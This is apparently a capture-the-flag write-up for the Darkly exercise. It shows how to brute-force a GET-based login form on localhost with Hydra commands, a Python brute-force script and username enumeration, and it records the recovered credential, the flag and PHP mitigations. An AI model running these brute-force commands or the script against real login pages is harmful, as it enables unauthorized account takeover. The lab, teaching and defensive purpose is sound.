# Hydra Login Brute-Force — Professional Exploit Guide

> **LinkedIn:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)

---

## Learning Objectives

- Brute-force attack techniques against HTTP login forms
- Differences between GET and POST parameter handling
- Password dictionary attack methodology
- Rate limiting circumvention strategies
- Weak credential detection and impact assessment

---

## Required Tools

| Tool | Purpose |
|------|---------|
| `hydra` | Network login brute-forcer |
| `curl` | Manual HTTP request testing |
| `Python 3` | Custom multi-threaded brute-force script |
| `wordlists` | Password dictionaries (rockyou, SecLists) |
| `John the Ripper` | Password cracking and wordlist generation |

---

## Prerequisites

- Understanding of HTTP authentication mechanisms
- Knowledge of GET vs. POST request differences
- Familiarity with password cracking tools and wordlists
- Basic command-line proficiency

---

## Vulnerability Overview

| Property | Value |
|----------|-------|
| **Parameters** | `username`, `password` (sent via GET) |
| **Endpoint** | `/?page=signin&username=<input>&password=<input>&Login=Login` |
| **Vulnerability** | Broken authentication — brute-force, CWE-307 |
| **CVSS Score** | 9.8 (Critical) |
| **Impact** | Unauthorized access, full account takeover |

The login form submits credentials as **GET parameters**, meaning passwords appear in:

- Browser history
- Server access logs
- Proxy/CDN logs
- HTTP `Referer` headers on outbound links

Additionally, there are **no rate limits, lockouts, or CAPTCHAs**, so an attacker can send unlimited login attempts.

---

## Step-by-Step Exploitation

### Step 1 — Identify the Login Endpoint

Navigate to the sign-in page and inspect the form action / method:

```bash
curl -v "http://localhost:8080/?page=signin" 2>&1 | grep -i 'action\|method'
```

Confirm that the form submits via GET and that `username` and `password` appear in the URL.

---

### Step 2 — Analyze the Request Structure

A failed login request looks like:

```
GET /?page=signin&username=admin&password=wrongpassword&Login=Login HTTP/1.1
Host: localhost:8080
```

---

### Step 3 — Identify the Failure Indicator

Inspect a failed login response to find a unique failure marker:

```bash
curl -s "http://localhost:8080/?page=signin&username=admin&password=INVALID&Login=Login" \
  | grep -i "wrong\|invalid\|error\|WrongAnswer"
```

The failure marker is: `images/WrongAnswer.gif`

A successful login response **does not** contain this string.

---

### Step 4 — Prepare a Password Wordlist

Use the bundled top-10,000 password list or a standard wordlist:

```bash
# Use the bundled list
ls Resources/10-million-password-list-top-10000.txt

# Or use rockyou
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

### Step 5 — Execute the Brute-Force Attack

#### Using the Python script (recommended):

```bash
python3 Resources/bruteforce_login.py \
  localhost:8080 \
  -u admin \
  -w Resources/10-million-password-list-top-10000.txt
```

#### Using Hydra:

```bash
hydra -l admin \
  -P Resources/10-million-password-list-top-10000.txt \
  localhost \
  http-get-form \
  "/?page=signin:username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif" \
  -t 16 -V
```

---

### Step 6 — Identify the Successful Credentials

The script stops on the first password where the failure indicator is absent:

```
[+] Success! Password: shadow
```

**Discovered credentials:** `admin:shadow`

---

### Step 7 — Extract the Flag from the Authenticated Session

```bash
curl -s "http://localhost:8080/?page=signin&username=admin&password=shadow&Login=Login" \
  | grep -oP '[0-9a-fA-F]{64}'
```

**Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

---

## Python Automation Script

The script `Resources/bruteforce_login.py` implements a configurable brute-forcer:

```python
#!/usr/bin/env python3
"""
Automates brute-forcing the HTTP GET login form from the Darkly exercise.
"""
import argparse, requests, re, sys

def brute_force_login(ip, username, wordlist, page, fail_pattern):
    url = f"http://{ip}/index.php"
    params = {'page': page, 'username': username, 'Login': 'Login'}

    with open(wordlist, 'r', errors='ignore') as f:
        for pwd in f:
            pwd = pwd.strip()
            if not pwd:
                continue
            params['password'] = pwd
            resp = requests.get(url, params=params, timeout=5)
            if fail_pattern not in resp.text:
                return pwd, resp.text
            print(f"[-] Failed: '{pwd}'")
    return None, None

def extract_flag(html):
    m = re.search(r'\b[0-9a-f]{64}\b', html)
    return m.group(0) if m else None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip')
    parser.add_argument('-u', '--username', default='admin')
    parser.add_argument('-w', '--wordlist', default='rockyou.txt')
    parser.add_argument('-p', '--page', default='signin')
    parser.add_argument('-f', '--fail-pattern', default='images/WrongAnswer.gif')
    args = parser.parse_args()

    pwd, html = brute_force_login(
        args.ip, args.username, args.wordlist, args.page, args.fail_pattern
    )
    if pwd:
        print(f"[+] Success! Password: {pwd}")
        flag = extract_flag(html)
        if flag:
            print(f"[+] Flag: {flag}")
    else:
        print("[-] No password found.")

if __name__ == "__main__":
    main()
```

**Usage:**

```bash
python3 Resources/bruteforce_login.py localhost:8080 \
  -u admin \
  -w Resources/10-million-password-list-top-10000.txt
```

---

## Hydra Command Examples

### GET Form Brute-Force (basic)

```bash
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  localhost \
  http-get-form \
  "/?page=signin:username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif" \
  -t 16
```

### Username Enumeration

```bash
hydra -L usernames.txt \
  -p password123 \
  localhost \
  http-get-form \
  "/?page=signin:username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif" \
  -t 8
```

### Optimized with Reduced Timeout

```bash
hydra -l admin \
  -P Resources/10-million-password-list-top-10000.txt \
  -t 32 \
  -w 3 \
  localhost \
  http-get-form \
  "/?page=signin:username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif"
```

---

## Defensive Mitigations

### 1. Use POST Instead of GET

```html
<!-- Prevents credentials from appearing in logs and history -->
<form method="POST" action="index.php?page=signin">
  <input type="text"     name="username" />
  <input type="password" name="password" />
  <input type="submit"   name="Login"    value="Login" />
</form>
```

### 2. Rate Limiting Per IP and Account

```php
<?php
// Simple PHP rate-limit using APCu (or Redis in production)
$ip  = $_SERVER['REMOTE_ADDR'];
$key = "login_attempts_{$ip}";
$attempts = apcu_fetch($key) ?: 0;

if ($attempts >= 5) {
    http_response_code(429);
    exit('Too many attempts. Please wait.');
}
apcu_store($key, $attempts + 1, 300); // Reset after 5 minutes
```

### 3. Account Lockout Mechanism

```php
<?php
// Lock account after N consecutive failures
$stmt = $pdo->prepare('SELECT failed_attempts, locked_until FROM users WHERE username = ?');
$stmt->execute([$username]);
$user = $stmt->fetch();

if ($user && $user['locked_until'] && new DateTime() < new DateTime($user['locked_until'])) {
    exit('Account locked. Try again later.');
}
```

### 4. Progressive Delays and CAPTCHA

```php
<?php
// Introduce exponential back-off after each failure
// Progression: 500ms → 1s → 2s → 4s → 8s → 16s → 30s (capped)
$delay = min(pow(2, $attempts) * 500, 30000);
usleep($delay * 1000);

// After 3 failures, require CAPTCHA
if ($attempts >= 3) {
    require_once 'captcha.php';
    if (!verify_captcha($_POST['g-recaptcha-response'])) {
        exit('CAPTCHA verification failed.');
    }
}
```

### 5. Multi-Factor Authentication (MFA)

```php
<?php
// After password verification, require TOTP
require_once 'vendor/autoload.php';
use OTPHP\TOTP;

$totp = TOTP::create($user['totp_secret']);
if (!$totp->verify($_POST['totp_code'])) {
    exit('Invalid MFA code.');
}
```

### 6. Strong Password Requirements

```php
<?php
function is_strong_password(string $pwd): bool {
    return strlen($pwd) >= 12
        && preg_match('/[A-Z]/', $pwd)
        && preg_match('/[a-z]/', $pwd)
        && preg_match('/[0-9]/', $pwd)
        && preg_match('/[\W_]/', $pwd);
}
```

### 7. Secure Password Hashing — bcrypt / Argon2

```php
<?php
// Store password
$hash = password_hash($plaintext_password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,
    'time_cost'   => 4,
    'threads'     => 2,
]);

// Verify password
if (!password_verify($plaintext_password, $stored_hash)) {
    exit('Invalid credentials.');
}
```

---

## Key Takeaways

1. **GET-based credentials** are fundamentally insecure — always use POST over HTTPS.
2. **No rate limiting** turns any login form into a trivial brute-force target.
3. **Common/weak passwords** like `shadow` are in every standard wordlist.
4. **Account lockout + CAPTCHA** are effective first-line defenses.
5. **bcrypt / Argon2** makes offline cracking impractical even if the database is compromised.
6. **MFA** eliminates single-factor credential compromise entirely.

---

## References & Resources

- [Hydra documentation](https://github.com/vanhauser-thc/thc-hydra)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Brute Force Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Brute_Force_Protection_Cheat_Sheet.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [NIST SP 800-63B — Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

> **Author:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)
